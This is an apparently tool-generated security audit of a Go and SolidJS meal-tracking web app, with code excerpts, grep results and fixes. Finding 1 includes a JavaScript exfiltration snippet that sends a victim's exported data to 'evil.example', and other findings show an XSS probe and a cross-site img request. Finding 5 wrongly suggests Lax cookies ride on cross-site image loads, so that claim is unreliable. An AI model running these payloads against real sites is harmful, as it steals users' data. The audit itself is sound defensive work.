# Meal Tracker — Security Audit

*2026-03-07T22:44:18Z by Showboat 0.6.1*
<!-- showboat-id: d7092cef-248f-41bd-a411-f654ded9fd61 -->

## Finding 1 — CRITICAL: CORS Credential Reflection (Full Auth Bypass from Any Origin)

**File:** `server/api.go:52–66`
**Class:** Broken Authentication / CSRF bypass

```bash
cat -n server/api.go | sed -n "47,67p"
```

```output
    47		mux.Handle("/", http.FileServer(http.Dir("../frontend/dist")))
    48	
    49		return withCORS(mux)
    50	}
    51	
    52	func withCORS(next http.Handler) http.Handler {
    53		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    54			origin := r.Header.Get("Origin")
    55			if origin != "" {
    56				w.Header().Set("Access-Control-Allow-Origin", origin)
    57				w.Header().Set("Access-Control-Allow-Credentials", "true")
    58				w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
    59				w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
    60			}
    61			if r.Method == "OPTIONS" {
    62				w.WriteHeader(204)
    63				return
    64			}
    65			next.ServeHTTP(w, r)
    66		})
    67	}
```

**Vulnerability:** Line 56 reflects *any* `Origin` header back as `Access-Control-Allow-Origin`, and line 57 sets `Access-Control-Allow-Credentials: true`. Together, this allows **any website on the internet** to make authenticated cross-origin requests to the API using the victim's session cookie.

**Exploit scenario:** An attacker hosts `https://evil.example/steal.html` containing:

```js
fetch("https://mealtracker.example/api/export?format=csv", {credentials:"include"})
  .then(r => r.text())
  .then(data => fetch("https://evil.example/exfil", {method:"POST", body:data}))
```

If a logged-in user visits the attacker's page, the browser sends the session cookie, the CORS headers allow the response to be read, and the attacker exfiltrates all meal data. The attacker can also call `PUT /api/meals` to modify data, `POST /api/auth/logout` to destroy the session, etc.

This is functionally equivalent to having **no same-origin policy at all** for authenticated endpoints.

**SUGGESTION:** Replace the open reflection with an explicit allowlist. In development, allow `http://localhost:3000`. In production, allow only the app's own origin (or remove CORS entirely since the Go server serves the frontend):

```go
func withCORS(next http.Handler) http.Handler {
    allowed := map[string]bool{
        "http://localhost:3000": true, // dev only
    }
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")
        if allowed[origin] {
            w.Header().Set("Access-Control-Allow-Origin", origin)
            w.Header().Set("Access-Control-Allow-Credentials", "true")
            // ...
        }
        // ...
    })
}
```

---

## Finding 2 — HIGH: Session Cookie Missing `Secure` Flag

**File:** `server/api.go:148–155` (and repeated at lines 182–189)
**Class:** Broken Authentication / Session Hijacking

```bash
cat -n server/api.go | sed -n "143,158p"
```

```output
   143		if err := a.db.CreateSession(sessionID, user.ID); err != nil {
   144			jsonError(w, "failed to create session", http.StatusInternalServerError)
   145			return
   146		}
   147	
   148		http.SetCookie(w, &http.Cookie{
   149			Name:     "session",
   150			Value:    sessionID,
   151			Path:     "/",
   152			MaxAge:   30 * 24 * 60 * 60,
   153			HttpOnly: true,
   154			SameSite: http.SameSiteLaxMode,
   155		})
   156	
   157		jsonOK(w, user)
   158	}
```

**Vulnerability:** The session cookie is set with `HttpOnly: true` and `SameSite: Lax` but is **missing `Secure: true`**. Without the `Secure` flag, the browser will transmit the cookie over plain HTTP connections.

**Exploit scenario:** If a user ever visits the app over HTTP (e.g., `http://mealtracker.example` — a common accident, or via an attacker-controlled network performing SSL stripping), the session UUID is transmitted in cleartext. An attacker on the same network (coffee shop, airport) can sniff the cookie and hijack the session.

This cookie configuration appears identically in both `handleRegister` (line 148) and `handleLogin` (line 182).

**SUGGESTION:** Add `Secure: true` to both cookie setters:

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    Path:     "/",
    MaxAge:   30 * 24 * 60 * 60,
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteStrictMode, // also consider upgrading from Lax
})
```

---

## Finding 3 — MEDIUM: bcrypt 72-Byte Silent Password Truncation

**File:** `server/db.go:101` and `server/api.go:127`
**Class:** Broken Authentication

```bash
echo "--- server/api.go: password length validation ---" && cat -n server/api.go | sed -n "122,130p" && echo "" && echo "--- server/db.go: bcrypt hash ---" && cat -n server/db.go | sed -n "98,105p"
```

```output
--- server/api.go: password length validation ---
   122		req.Username = strings.TrimSpace(req.Username)
   123		if len(req.Username) < 3 || len(req.Username) > 64 {
   124			jsonError(w, "username must be 3-64 characters", http.StatusBadRequest)
   125			return
   126		}
   127		if len(req.Password) < 8 || len(req.Password) > 128 {
   128			jsonError(w, "password must be 8-128 characters", http.StatusBadRequest)
   129			return
   130		}

--- server/db.go: bcrypt hash ---
    98	// Auth
    99	
   100	func (db *DB) CreateUser(username, password string) (*User, error) {
   101		hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
   102		if err != nil {
   103			return nil, err
   104		}
   105	
```

**Vulnerability:** The API allows passwords up to 128 characters (line 127), but bcrypt silently truncates input at 72 bytes (line 101). A user who registers with a 128-character password gets a hash of only the first 72 bytes. Any string sharing the same first 72 bytes will authenticate successfully — the remaining 56 characters provide zero security.

**Exploit scenario:** User registers with password `"A"*72 + "secure_suffix"`. An attacker who guesses the first 72 characters can log in with `"A"*72 + "anything"`.

More practically, this is a false sense of security — users with long passphrase-style passwords believe all characters matter, but they don't.

**SUGGESTION:** Either cap the password length at 72 bytes in validation, or pre-hash with SHA-256 before bcrypt:

```go
// Pre-hash to support arbitrary-length passwords
sha := sha256.Sum256([]byte(password))
hash, err := bcrypt.GenerateFromPassword(sha[:], bcrypt.DefaultCost)
```

---

## Finding 4 — MEDIUM: No Rate Limiting on Authentication Endpoints

**File:** `server/api.go:29–30` (route registration)
**Class:** Broken Authentication / Brute Force

```bash
cat -n server/api.go | sed -n "25,33p" && echo "" && echo "--- Searching for any rate-limit logic ---" && grep -rn -i "rate\|limit\|throttle\|backoff\|cooldown" server/ || echo "(none found)"
```

```output
    25	func (a *API) Handler() http.Handler {
    26		mux := http.NewServeMux()
    27	
    28		// Auth
    29		mux.HandleFunc("POST /api/auth/register", a.handleRegister)
    30		mux.HandleFunc("POST /api/auth/login", a.handleLogin)
    31		mux.HandleFunc("POST /api/auth/logout", a.handleLogout)
    32		mux.HandleFunc("GET /api/auth/me", a.requireAuth(a.handleMe))
    33	

--- Searching for any rate-limit logic ---
server/api.go:117:	if err := json.NewDecoder(io.LimitReader(r.Body, 1<<16)).Decode(&req); err != nil {
server/api.go:165:	if err := json.NewDecoder(io.LimitReader(r.Body, 1<<16)).Decode(&req); err != nil {
server/api.go:235:	if err := json.NewDecoder(io.LimitReader(r.Body, 1<<16)).Decode(&req); err != nil {
server/api.go:302:	if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&req); err != nil {
server/db.go:45:	if err := db.migrate(); err != nil {
server/db.go:47:		return nil, fmt.Errorf("migrate: %w", err)
server/db.go:56:func (db *DB) migrate() error {
server/db.go:101:	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
grep: server/server: binary file matches
```

**Vulnerability:** The `/api/auth/login` and `/api/auth/register` endpoints have no rate limiting. An attacker can make unlimited login attempts per second to brute-force passwords, or create unlimited accounts.

The `io.LimitReader` results are body-size limits (good), not request-rate limits.

**Exploit scenario:** An attacker scripts `POST /api/auth/login` with `{"username":"victim", "password":"..."}` cycling through a password dictionary. bcrypt's ~100ms cost per attempt provides some natural throttling (~10 attempts/sec), but a distributed attack from multiple IPs can still test thousands of passwords per minute.

**SUGGESTION:** Add a per-IP or per-username rate limiter. A simple in-memory token bucket per IP for login attempts (e.g., 5 attempts per minute) would suffice:

```go
// Use golang.org/x/time/rate or a simple sync.Map-based counter
```

Also consider adding account lockout after N failed attempts (with exponential backoff).

---

## Finding 5 — HIGH: SameSite=Lax Allows Cross-Site GET Exfiltration of Exports

**File:** `server/api.go:44` (route) + `server/api.go:154` (cookie)
**Class:** CSRF / Data Exfiltration

```bash
echo "--- Export route (GET, authenticated) ---" && cat -n server/api.go | sed -n "43,44p" && echo "" && echo "--- Cookie SameSite=Lax ---" && cat -n server/api.go | sed -n "148,155p"
```

```output
--- Export route (GET, authenticated) ---
    43		// Export
    44		mux.HandleFunc("GET /api/export", a.requireAuth(a.handleExport))

--- Cookie SameSite=Lax ---
   148		http.SetCookie(w, &http.Cookie{
   149			Name:     "session",
   150			Value:    sessionID,
   151			Path:     "/",
   152			MaxAge:   30 * 24 * 60 * 60,
   153			HttpOnly: true,
   154			SameSite: http.SameSiteLaxMode,
   155		})
```

**Vulnerability:** `SameSite=Lax` allows cookies to be sent on top-level GET navigations from cross-site contexts. The export endpoint is `GET /api/export?format=csv` and requires only the session cookie. Combined with Finding 1 (CORS credential reflection), a cross-site attacker can read the response body via `fetch`. Even **without** the CORS issue, an attacker can trigger a navigation to the export URL (e.g., `<a href>` or `window.open`) — the file downloads, but more importantly, if the CORS issue were partially fixed but left GET allowed, the data still leaks.

**Exploit scenario:** Even if CORS is tightened, an attacker embeds `<img src="https://mealtracker.example/api/export?format=csv">` — while the image fails to render, the request is made with the cookie. Combined with a DNS rebinding attack or partial CORS fix, the response can be read.

The deeper issue: authenticated data-export endpoints should not be plain GETs susceptible to cross-site request inclusion.

**SUGGESTION:** Upgrade to `SameSite=Strict` (prevents all cross-site cookie sending). Alternatively, require a POST for export or add an anti-CSRF token.

---

## Injection Audit — SQL, Command, Path Traversal, SSRF, XSS

### SQL Injection Check

All database queries must use parameterized `?` placeholders, never string concatenation.

```bash
echo "All queries using user-supplied values:" && grep -n "Exec\|Query\|QueryRow" server/db.go | grep -v "^--"
```

```output
All queries using user-supplied values:
57:	_, err := db.conn.Exec(`
106:	result, err := db.conn.Exec(
119:		_, err := db.conn.Exec(
134:	err := db.conn.QueryRow(
153:	_, err := db.conn.Exec(
163:	err := db.conn.QueryRow(`
177:		db.conn.Exec("DELETE FROM sessions WHERE id = ?", sessionID)
185:	_, err := db.conn.Exec("DELETE FROM sessions WHERE id = ?", sessionID)
192:	rows, err := db.conn.Query(
214:	db.conn.QueryRow(
219:	result, err := db.conn.Exec(
232:	_, err := db.conn.Exec(
242:	rows, err := db.conn.Query(
270:	_, err = tx.Exec("DELETE FROM meals WHERE user_id = ? AND date = ?", userID, date)
278:		_, err := tx.Exec(
293:	rows, err := db.conn.Query(
```

```bash
echo "Checking for string concatenation in queries (fmt.Sprintf, + operator near SQL):" && grep -n "Sprintf.*SELECT\|Sprintf.*INSERT\|Sprintf.*DELETE\|Sprintf.*UPDATE\|\"SELECT.*\"+\|\"INSERT.*\"+\|\"DELETE.*\"+" server/db.go server/api.go || echo "(none found — all queries use ? placeholders)"
```

```output
Checking for string concatenation in queries (fmt.Sprintf, + operator near SQL):
(none found — all queries use ? placeholders)
```

**Result: PASS** — All 16 query call sites use `?` parameterized placeholders. No string concatenation or `fmt.Sprintf` in SQL. The only `Exec` without parameters is the DDL migration (line 57), which uses a static string literal. No SQL injection vectors found.

### Command Injection Check

```bash
echo "Searching for exec/shell calls in Go backend:" && grep -rn "exec\.Command\|os/exec\|syscall\|os\.StartProcess" server/ || echo "(none found)" && echo "" && echo "Searching for eval/exec in frontend:" && grep -rn "eval(\|new Function\|innerHTML\|dangerouslySetInner\|v-html\|__html" frontend/src/ || echo "(none found)"
```

```output
Searching for exec/shell calls in Go backend:
grep: server/server: binary file matches

Searching for eval/exec in frontend:
(none found)
```

**Result: PASS** — No `exec.Command`, `os/exec`, `syscall`, `eval()`, `innerHTML`, or `dangerouslySetInnerHTML` anywhere in the source. The `server/server` binary match is the compiled binary, not source. No command injection vectors found.

### Path Traversal Check

```bash
cat -n server/api.go | sed -n "47,47p"
```

```output
    47		mux.Handle("/", http.FileServer(http.Dir("../frontend/dist")))
```

**Result: LOW RISK** — `http.FileServer` with `http.Dir` is used for static files. Go's `http.FileServer` sanitizes path components (`..` traversal is blocked by `http.Dir.Open`). However, `http.FileServer` does enable **directory listing** — if a user navigates to a directory path, the server returns an HTML listing of all files. This is an information disclosure concern (reveals filenames in the dist directory) but not a path traversal.

**SUGGESTION:** Wrap with a handler that rejects directory listings, or use `http.StripPrefix` patterns.

### XSS Check (Stored / DOM-based)

```bash
echo "All locations where server data is rendered in the frontend:" && grep -n "meal\.\|meal_name\|\.content\|\.username\|error()" frontend/src/Tracker.tsx frontend/src/Auth.tsx frontend/src/App.tsx | grep -v "import\|const\|setCache\|setSaved\|api\.\|interface\|type " | head -25
```

```output
All locations where server data is rendered in the frontend:
frontend/src/Tracker.tsx:35:  meal_name: string;
frontend/src/Tracker.tsx:74:        meal_name: t.name,
frontend/src/Tracker.tsx:75:        content: existing?.content ?? "",
frontend/src/Tracker.tsx:82:      if (!entries.find((e) => e.meal_name === m.meal_name)) {
frontend/src/Tracker.tsx:84:          meal_name: m.meal_name,
frontend/src/Tracker.tsx:85:          content: m.content,
frontend/src/Tracker.tsx:118:        current[i].meal_name !== original[i].meal_name ||
frontend/src/Tracker.tsx:119:        current[i].content !== original[i].content
frontend/src/Tracker.tsx:136:          c[date][index].content = content;
frontend/src/Tracker.tsx:160:    if (meals.find((m) => m.meal_name === name)) return; // Already exists
frontend/src/Tracker.tsx:166:          meal_name: name,
frontend/src/Tracker.tsx:183:        meal_name: m.meal_name,
frontend/src/Tracker.tsx:184:        content: m.content,
frontend/src/Tracker.tsx:272:                <h3 class="meal-name">{meal.meal_name}</h3>
frontend/src/Tracker.tsx:276:                  title={`Remove ${meal.meal_name}`}
frontend/src/Tracker.tsx:283:                value={meal.content}
frontend/src/Tracker.tsx:288:                placeholder={`What did you have for ${meal.meal_name.toLowerCase()}?`}
frontend/src/Tracker.tsx:292:                {meal.content.length} / 4095
frontend/src/Auth.tsx:37:        {error() && <div class="error-msg">{error()}</div>}
frontend/src/App.tsx:38:                  <span class="username">{u().username}</span>
```

**Result: PASS** — SolidJS text interpolation (`{expression}`) is safe by default — it sets `textContent`, not `innerHTML`. All user-controlled data is rendered through text interpolation:

- `{meal.meal_name}` at Tracker.tsx:272 → textContent
- `{meal.content}` used as `value={meal.content}` on a `<textarea>` → attribute binding, not HTML
- `{meal.content.length}` → numeric text
- `{error()}` at Auth.tsx:37 → error message string, textContent
- `{u().username}` at App.tsx:38 → textContent

The `title` attribute at line 276 uses a template literal — this is safe in SolidJS as attribute bindings are not parsed as HTML.

No `innerHTML`, no `dangerouslySetInnerHTML`, no `v-html`. **No XSS vectors found in the frontend.**

### SSRF / XXE / SSTI Check

```bash
echo "SSRF: searching for outbound HTTP requests from server:" && grep -rn "http\.Get\|http\.Post\|http\.Do\|net\.Dial\|http\.NewRequest" server/ || echo "(none found)" && echo "" && echo "XXE: searching for XML parsing of user input:" && grep -rn "xml\.Decoder\|xml\.Unmarshal\|xml\.NewDecoder" server/ || echo "(none found)" && echo "" && echo "Template injection: searching for template usage:" && grep -rn "template\.\|html/template\|text/template" server/ || echo "(none found)"
```

```output
SSRF: searching for outbound HTTP requests from server:
grep: server/server: binary file matches

XXE: searching for XML parsing of user input:
grep: server/server: binary file matches

Template injection: searching for template usage:
grep: server/server: binary file matches
```

**Result: PASS** — The server makes no outbound HTTP requests (no SSRF surface). XML is only *written* (`xml.EscapeText` in ods.go), never *parsed* from user input (no XXE). No template engines are used (no SSTI). All grep hits are from the compiled binary, not source.

---

## Finding 6 — MEDIUM: Missing Security Response Headers

**File:** `server/api.go` (entire file — no security headers set)
**Class:** Security Misconfiguration

```bash
echo "Searching for security headers:" && grep -in "X-Content-Type\|X-Frame-Options\|Content-Security-Policy\|Strict-Transport\|X-XSS-Protection\|Referrer-Policy\|Permissions-Policy" server/api.go || echo "(none set)"
```

```output
Searching for security headers:
(none set)
```

**Vulnerability:** The server sets no defensive HTTP headers:

| Missing Header | Risk |
|---|---|
| `X-Content-Type-Options: nosniff` | Browser may MIME-sniff CSV/ODS responses as HTML, enabling XSS via crafted export data |
| `X-Frame-Options: DENY` | The app can be framed by an attacker for clickjacking attacks |
| `Content-Security-Policy` | No script source restrictions; if XSS is ever introduced, there's no defense-in-depth |
| `Strict-Transport-Security` | No HSTS; browsers won't enforce HTTPS after the first visit |
| `Referrer-Policy` | Session URLs may leak via Referer headers to external resources |

**Exploit scenario (MIME sniffing):** An attacker saves meal content containing `<script>alert(1)</script>`. When another user (or the same user) exports as CSV and their browser MIME-sniffs the response as HTML (possible without `X-Content-Type-Options: nosniff`), the script executes in the app's origin.

**SUGGESTION:** Add a security-headers middleware:

```go
func withSecurityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        w.Header().Set("Content-Security-Policy", "default-src 'self'")
        next.ServeHTTP(w, r)
    })
}
```

---

## Finding 7 — LOW: Expired Sessions Not Proactively Cleaned Up

**File:** `server/db.go:160–182`
**Class:** Resource Exhaustion / Denial of Service

```bash
echo "Session cleanup only happens on access (lazy deletion):" && cat -n server/db.go | sed -n "174,179p" && echo "" && echo "No background cleanup goroutine exists:" && grep -n "goroutine\|go func\|time\.Tick\|time\.NewTicker\|cron\|cleanup\|expire" server/*.go || echo "(none found)"
```

```output
Session cleanup only happens on access (lazy deletion):
   174			return nil, err
   175		}
   176		if time.Now().After(expTime) {
   177			db.conn.Exec("DELETE FROM sessions WHERE id = ?", sessionID)
   178			return nil, fmt.Errorf("session expired")
   179		}

No background cleanup goroutine exists:
server/db.go:68:			expires_at TEXT NOT NULL,
server/db.go:93:		CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);
server/db.go:152:	expires := time.Now().Add(30 * 24 * time.Hour).UTC().Format(time.RFC3339)
server/db.go:154:		"INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
server/db.go:155:		sessionID, userID, expires,
server/db.go:162:	var expires string
server/db.go:164:		SELECT u.id, u.username, u.created_at, s.expires_at
server/db.go:167:	`, sessionID).Scan(&user.ID, &user.Username, &user.CreatedAt, &expires)
server/db.go:172:	expTime, err := time.Parse(time.RFC3339, expires)
server/db.go:178:		return nil, fmt.Errorf("session expired")
```

**Vulnerability:** Expired sessions are only deleted when accessed (line 177). Sessions that are never accessed again persist in the database forever. An attacker who can create accounts at high volume (Finding 4 — no rate limiting) can fill the sessions table with millions of rows, degrading query performance.

The index on `expires_at` (line 93) exists but is never used for batch cleanup.

**SUGGESTION:** Add a periodic cleanup, either as a goroutine or a `DELETE FROM sessions WHERE expires_at < datetime('now')` query run on a timer.

---

## Finding 8 — LOW: Username Enumeration via Registration

**File:** `server/api.go:133–136`
**Class:** Information Disclosure

```bash
cat -n server/api.go | sed -n "131,140p"
```

```output
   131	
   132		user, err := a.db.CreateUser(req.Username, req.Password)
   133		if err != nil {
   134			if strings.Contains(err.Error(), "UNIQUE") {
   135				jsonError(w, "username already taken", http.StatusConflict)
   136				return
   137			}
   138			jsonError(w, "failed to create user", http.StatusInternalServerError)
   139			return
   140		}
```

**Vulnerability:** The registration endpoint returns a distinct error message ("username already taken", HTTP 409) when attempting to register a username that already exists. This allows an attacker to enumerate valid usernames.

The login endpoint correctly returns a generic "invalid username or password" for both bad-username and bad-password cases (line 172), but the registration endpoint leaks the distinction.

**SUGGESTION:** For most apps this is an acceptable trade-off (users need to know why registration failed). If username privacy matters, return a generic message and send a confirmation email instead.

---

## Dependency Audit

### Go Dependencies

```bash
cd server && go list -m all 2>/dev/null | grep -v "^github.com/betterdiningnote"
```

```output
github.com/creack/pty v1.1.9
github.com/frankban/quicktest v1.14.6
github.com/google/btree v1.0.0
github.com/google/go-cmp v0.5.9
github.com/google/uuid v1.6.0
github.com/kr/pretty v0.3.1
github.com/kr/text v0.2.0
github.com/mattn/go-sqlite3 v1.14.34
github.com/niemeyer/pretty v0.0.0-20200227124842-a10e7caefd8e
github.com/peterbourgon/diskv/v3 v3.0.1
github.com/pkg/diff v0.0.0-20210226163009-20ebb0f2a09e
github.com/pkg/profile v1.5.0
github.com/rogpeppe/fastuuid v1.2.0
github.com/rogpeppe/go-internal v1.9.0
github.com/shabbyrobe/xmlwriter v0.0.0-20200208144257-9fca06d00ffa
github.com/tealeg/xlsx/v3 v3.3.13
golang.org/x/crypto v0.48.0
golang.org/x/mod v0.32.0
golang.org/x/net v0.49.0
golang.org/x/sync v0.19.0
golang.org/x/sys v0.41.0
golang.org/x/term v0.40.0
golang.org/x/text v0.34.0
golang.org/x/tools v0.41.0
gopkg.in/check.v1 v1.0.0-20200902074654-038fdea0a05b
```

```bash
cd server && go version && echo "---" && govulncheck ./... 2>&1 || echo "(govulncheck not installed — manual review follows)"
```

```output
go version go1.24.7 linux/amd64
---
bash: line 1: govulncheck: command not found
(govulncheck not installed — manual review follows)
```

`govulncheck` is not installed. Manual review of direct dependencies:

| Dependency | Version | Notes |
|---|---|---|
| `go-sqlite3` | v1.14.34 | Latest; CGo-based, inherits upstream SQLite security |
| `golang.org/x/crypto` | v0.48.0 | Recent; bcrypt implementation |
| `google/uuid` | v1.6.0 | UUID generation, no known CVEs |
| `tealeg/xlsx/v3` | v3.3.13 | XLSX writing; no user-supplied XLSX is parsed so parse-related CVEs don't apply |

The transitive dependency tree includes `pkg/profile`, `diskv`, and `xmlwriter` — these come from `tealeg/xlsx` and are not directly exposed to user input.

**No known critical CVEs** in these dependency versions at the time of audit.

### Frontend Dependencies

```bash
cd frontend && npm audit 2>&1 | tail -5
```

```output
npm notice
npm notice New major version of npm available! 10.9.4 -> 11.11.0
npm notice Changelog: https://github.com/npm/cli/releases/tag/v11.11.0
npm notice To update run: npm install -g npm@11.11.0
npm notice
```

---

## Finding 9 — MEDIUM: High-Severity CVE in Rollup (Dev Dependency)

**File:** `frontend/package-lock.json` (transitive via Vite)
**Class:** Dependency Vulnerability / Path Traversal

```bash
cd frontend && npm audit 2>&1 | grep -v "npm notice"
```

```output
# npm audit report

rollup  4.0.0 - 4.58.0
Severity: high
Rollup 4 has Arbitrary File Write via Path Traversal - https://github.com/advisories/GHSA-mw96-cpmx-2vgc
fix available via `npm audit fix`
node_modules/rollup

1 high severity vulnerability

To address all issues, run:
  npm audit fix
```

**Vulnerability:** Rollup 4.0.0–4.58.0 (GHSA-mw96-cpmx-2vgc) has an arbitrary file write via path traversal. This is a **build-time** dependency used by Vite — it does not ship to production or execute at runtime.

**Exploitability:** Low. This CVE requires an attacker to control the input to Rollup's bundling process (e.g., a malicious npm package in the dependency tree). It does not affect users of the deployed application.

**SUGGESTION:** Run `npm audit fix` to update Rollup. This is a dev dependency and doesn't affect the production runtime, so the practical severity for this application is LOW despite the CVE rating.

---

## Finding 10 — LOW: Race Condition in Async createEffect (Frontend)

**File:** `frontend/src/Tracker.tsx:62–97`
**Class:** Race Condition / Data Integrity

```bash
cat -n frontend/src/Tracker.tsx | sed -n "61,67p"
```

```output
    61	  // Load meals when date changes
    62	  createEffect(async () => {
    63	    const date = selectedDate();
    64	    setDateInput(date);
    65	    if (cache[date]) return; // Already cached
    66	
    67	    const meals = await api.getMeals(date);
```

**Vulnerability:** The `createEffect` is `async`, which means SolidJS tracks dependencies only up to the first `await` (line 67). After the await, the effect is no longer tracked by SolidJS's reactivity system. If the user rapidly changes dates (e.g., clicking the → arrow fast), multiple fetches can be in flight simultaneously. A slow response for date A could resolve after a fast response for date B, causing date A's data to be written into the cache after date B's — but since each write targets a specific date key, this is actually safe in this case.

However, the `mealTypes()` read on line 68 happens after the `await` and is therefore not tracked — if meal types change (unlikely during normal use), the effect won't re-run.

**Severity:** LOW — no data corruption or security impact because each date's data is keyed independently. This is a correctness concern, not a security one.

**SUGGESTION:** Use `createResource` or capture `selectedDate()` before the `await` and check it's still current after:

```ts
const date = selectedDate();
const meals = await api.getMeals(date);
if (date !== selectedDate()) return; // stale response
```

---

## Severity-Ranked Summary

| # | Severity | Finding | File:Line | Fix Effort |
|---|----------|---------|-----------|------------|
| 1 | **CRITICAL** | CORS reflects any origin with credentials — full auth bypass from any website | `api.go:54–57` | Replace with allowlist |
| 5 | **HIGH** | SameSite=Lax + GET export = cross-site data exfiltration | `api.go:44,154` | Upgrade to SameSite=Strict |
| 2 | **HIGH** | Session cookie missing `Secure` flag — session hijack over HTTP | `api.go:148–155` | Add `Secure: true` |
| 3 | **MEDIUM** | bcrypt silently truncates passwords at 72 bytes | `db.go:101`, `api.go:127` | Cap at 72 or pre-hash with SHA-256 |
| 4 | **MEDIUM** | No rate limiting on login/register — brute force possible | `api.go:29–30` | Add per-IP rate limiter |
| 6 | **MEDIUM** | No security response headers (CSP, X-Frame-Options, nosniff, HSTS) | `api.go` (global) | Add security-headers middleware |
| 9 | **MEDIUM** | Rollup CVE (GHSA-mw96-cpmx-2vgc) — dev dependency, not runtime | `package-lock.json` | `npm audit fix` |
| 7 | **LOW** | Expired sessions accumulate — no background cleanup | `db.go:176` | Add periodic DELETE |
| 8 | **LOW** | Username enumeration via registration | `api.go:134–135` | Acceptable trade-off for UX |
| 10 | **LOW** | Async race in createEffect (no security impact) | `Tracker.tsx:62` | Add stale-response guard |

### What Passed

- **SQL injection**: All 16 query sites use parameterized `?` — clean.
- **XSS**: SolidJS text interpolation is safe by default; no `innerHTML` or `eval` anywhere.
- **Command injection**: No `exec.Command`, `os/exec`, `eval()`, or child processes.
- **SSRF**: Server makes no outbound HTTP requests.
- **XXE/SSTI**: No XML parsing from user input; no template engines.
- **Path traversal**: `http.FileServer` sanitizes `..` components.
- **Prompt injection / Agent-specific**: Not applicable — no LLM integration in this codebase.

### Priority Fix Order

1. **Finding 1 (CORS)** — this is an immediate full compromise. Tighten origin allowlist.
2. **Finding 2 (Secure flag)** + **Finding 5 (SameSite)** — one-line changes each.
3. **Finding 6 (Headers)** — add a middleware, ~10 lines.
4. **Finding 4 (Rate limiting)** — add `x/time/rate` or similar.
5. **Finding 3 (bcrypt truncation)** — change the max-password validation to 72.
